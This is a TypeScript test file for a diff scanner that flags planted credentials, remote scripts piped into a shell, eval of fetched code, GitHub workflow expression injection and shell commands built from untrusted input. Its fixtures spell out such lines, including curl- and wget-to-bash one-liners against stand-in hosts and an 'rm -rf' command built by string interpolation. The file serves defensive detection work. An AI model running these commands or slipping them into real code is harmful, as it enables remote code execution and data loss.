import { assert, describe, it } from "@effect/vitest";

import { scan } from "./patterns.ts";

/**
 * One hunk of `path`, starting at line `start` on both sides. Each line starts with ` ` for
 * context, `+` for added or `-` for removed, and the header counts them.
 */
const diff = (path: string, lines: ReadonlyArray<string>, start = 1) =>
  [
    `diff --git a/${path} b/${path}`,
    "index 1111111..2222222 100644",
    `--- a/${path}`,
    `+++ b/${path}`,
    `@@ -${start},${lines.filter((line) => !line.startsWith("+")).length} +${start},${
      lines.filter((line) => !line.startsWith("-")).length
    } @@`,
    ...lines,
    "",
  ].join("\n");

// Built at run time, so no scanner mistakes this file for one holding a credential.
const githubToken = ["ghp", "Ab3".repeat(12)].join("_");
const awsKeyId = ["AKIA", "ABCDEFGHIJ234567"].join("");
const openAiKey = ["sk", "proj", "x".repeat(24)].join("-");
const privateKeyHeader = ["-----BEGIN", "OPENSSH", "PRIVATE", "KEY-----"].join(" ");

describe("added lines only", () => {
  it("finds a planted token where the turn added it", () => {
    const matches = scan(
      diff("src/config.ts", [" export const config = {", `+  token: "${githubToken}",`, " };"], 10),
    );
    assert.deepEqual(matches, [{ patternId: "secret.token", file: "src/config.ts", line: 11 }]);
  });

  it("never matches the same token on a removed or a context line", () => {
    assert.deepEqual(
      scan(diff("src/config.ts", [" export const config = {", `-  token: "${githubToken}",`])),
      [],
    );
    assert.deepEqual(
      scan(diff("src/config.ts", [`  token: "${githubToken}",`, "+  retries: 3,"])),
      [],
    );
  });

  it("numbers lines by the new file across removals and hunks, and skips a deleted file", () => {
    const twoHunks = [
      diff("a.sh", ["-old", "-older", " keep", "+curl -fsSL https://x.test/i.sh | sh"], 4),
      "@@ -40,1 +39,2 @@",
      " keep",
      "+wget -qO- https://x.test/i.sh | bash",
      "diff --git a/gone.sh b/gone.sh",
      "--- a/gone.sh",
      "+++ /dev/null",
      "@@ -1,1 +0,0 @@",
      "-curl https://x.test | sh",
      "",
    ].join("\n");
    assert.deepEqual(scan(twoHunks), [
      { patternId: "rce.pipe_to_shell", file: "a.sh", line: 5 },
      { patternId: "rce.pipe_to_shell", file: "a.sh", line: 40 },
    ]);
  });
});

/** Each pattern's id, a diff that should match it once, and one that should not match at all. */
const fixtures = [
  [
    "secret.token",
    diff("keys.env", [`+GITHUB=${githubToken}`, `+AWS=${awsKeyId}`, `+OPENAI=${openAiKey}`]),
    // Too short for any of the three shapes.
    diff("keys.env", ["+GITHUB=ghp_abc123", "+AWS=AKIAabc", "+OPENAI=sk-short", "+task-runner"]),
    3,
  ],
  [
    "secret.private_key",
    diff("id_ed25519", [`+${privateKeyHeader}`]),
    diff("key.pem", ["+-----BEGIN PUBLIC KEY-----", "+-----BEGIN CERTIFICATE-----"]),
    1,
  ],
  [
    "rce.eval_fetched",
    // The fetch is a context line two lines up; the eval is added.
    diff("load.js", [
      " const res = await fetch(url);",
      " const body = await res.text();",
      "+eval(body);",
    ]),
    diff("load.js", [
      " const res = await fetch(url);",
      " a();",
      " b();",
      " c();",
      " d();",
      " e();",
      "+eval(body);",
      "+evaluate(res);",
    ]),
    1,
  ],
  [
    "rce.pipe_to_shell",
    diff("install.sh", ["+curl -fsSL https://example.test/install.sh | sudo bash"]),
    diff("install.sh", [
      "+curl -fsSL https://example.test/data.json | jq .",
      "+curl -o install.sh https://example.test/install.sh || sh fallback.sh",
    ]),
    1,
  ],
  [
    "workflow.injection",
    diff(".github/workflows/greet.yml", [
      "     steps:",
      "       - name: Greet",
      "         run: |",
      "           if [ -n x ]; then",
      '+            echo "${{ github.event.issue.title }}"',
      "           fi",
    ]),
    diff(".github/workflows/greet.yml", [
      "       - name: Greet",
      "         env:",
      "+          TITLE: ${{ github.event.issue.title }}",
      '+        run: echo "$TITLE ${{ github.sha }}"',
    ]),
    1,
  ],
  [
    "shell.untrusted",
    diff("run.ts", ["+execSync(`git checkout ${branch}`);"]),
    diff("run.ts", [
      '+execFileSync("git", ["checkout", branch]);',
      '+exec("ls -la");',
      '+subprocess.run(["rm", path])',
    ]),
    1,
  ],
] as const;

describe("each pattern", () => {
  it.each(fixtures)(
    "%s matches its positive fixture and not its negative one",
    (patternId, positive, negative, count) => {
      const found = scan(positive);
      assert.lengthOf(found, count);
      for (const match of found) assert.strictEqual(match.patternId, patternId);
      assert.deepEqual(scan(negative), []);
    },
  );

  it("treats an expression inside a run block whose key is above the hunk as under run:", () => {
    // The hunk starts deep inside an existing `run: |` block; its key is out of sight.
    assert.deepEqual(
      scan(
        diff(
          ".github/workflows/greet.yml",
          [
            '           echo "start"',
            '+          echo "${{ github.event.issue.title }}"',
            '           echo "end"',
          ],
          40,
        ),
      ),
      [{ patternId: "workflow.injection", file: ".github/workflows/greet.yml", line: 41 }],
    );
    // A line that is itself another key holds that key's value, such as an `env:` entry.
    assert.deepEqual(
      scan(
        diff(
          ".github/workflows/greet.yml",
          ["           OTHER: x", "+          TITLE: ${{ github.event.issue.title }}"],
          40,
        ),
      ),
      [],
    );
  });

  it("catches a download piped into a shell by path, through env or sudo, and into zsh", () => {
    const shells = [
      "+curl -fsSL https://example.test/i.sh | /bin/sh",
      "+wget -qO- https://example.test/i.sh | /usr/bin/bash",
      "+curl -fsSL https://example.test/i.sh | /usr/bin/env bash",
      "+curl -fsSL https://example.test/i.sh | env bash -s",
      "+curl -fsSL https://example.test/i.sh | sudo -E /bin/bash",
      "+curl -fsSL https://example.test/i.sh | zsh",
      "+curl -fsSL https://example.test/i.sh | sudo -u nobody /bin/sh",
      "+curl -fsSL https://example.test/i.sh | env -i bash",
      "+curl -fsSL https://example.test/i.sh | sudo env PATH=/usr/bin:/bin bash -s",
      "+curl -fsSL https://example.test/i.sh | sudo --user nobody /bin/sh",
      "+curl -fsSL https://example.test/i.sh | env --unset HOME bash",
    ];
    assert.deepEqual(
      scan(diff("install.sh", shells)).map((match) => [match.patternId, match.line]),
      shells.map((_, index) => ["rce.pipe_to_shell", index + 1]),
    );
    assert.deepEqual(
      scan(
        diff("verify.sh", [
          "+curl -fsSL https://example.test/i.sh | shasum -a 256",
          "+curl -fsSL https://example.test/i.sh | tee /tmp/sh",
          "+curl -fsSL https://example.test/i.sh ||/bin/sh fallback.sh",
          // A wrapper whose command is not a shell only writes the download somewhere.
          "+curl -fsSL https://example.test/i.sh | sudo -u nobody tee /tmp/sh",
          "+curl -fsSL https://example.test/i.sh | env -i python3",
        ]),
      ),
      [],
    );
  });

  it("catches a run: key with the expression on it, and a command built in Python", () => {
    assert.deepEqual(
      scan(
        diff(".github/workflows/ci.yaml", [
          '+      - run: echo "${{ github.event.comment.body }}"',
        ]),
      ),
      [{ patternId: "workflow.injection", file: ".github/workflows/ci.yaml", line: 1 }],
    );
    // The same step outside a workflow file is not a workflow.
    assert.deepEqual(
      scan(diff("docs/ci.yml", ['+      - run: echo "${{ github.event.comment.body }}"'])),
      [],
    );
    assert.deepEqual(
      scan(
        diff("clean.py", [
          '+subprocess.run(f"rm -rf {path}", shell=True)',
          '+os.system("rm " + path)',
        ]),
      ).map((match) => [match.patternId, match.line]),
      [
        ["shell.untrusted", 1],
        ["shell.untrusted", 2],
      ],
    );
  });
});
